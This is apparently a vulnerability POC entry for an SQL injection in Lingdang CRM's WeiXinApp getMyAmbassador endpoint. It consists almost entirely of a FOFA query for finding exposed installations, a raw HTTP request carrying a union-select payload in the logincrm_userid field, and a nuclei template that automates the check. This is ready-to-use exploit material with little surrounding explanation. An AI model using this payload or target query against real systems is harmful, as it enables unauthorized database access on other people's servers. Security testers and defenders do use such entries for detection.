# fofa

```plain
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

# POC

```http
POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

logincrm_userid=-1 union select user(),2,3#
```

# nuclei

```yaml
id: lingdang-crm-getMyAmbassador-sqli

info:
  name: lingdang crm getMyAmbassador SQL injection
  author: zxf
  severity: high
  metadata:
    fofasearch: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")

http:
  - raw:
      - |
        POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        logincrm_userid=-1 union select user(),2,3#
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"@localhost")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739271497383-bc575fc2-58ae-4892-be44-d13ee8f81eba.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739271533587-ba085017-8c37-409c-b9c3-111395eec2c4.png)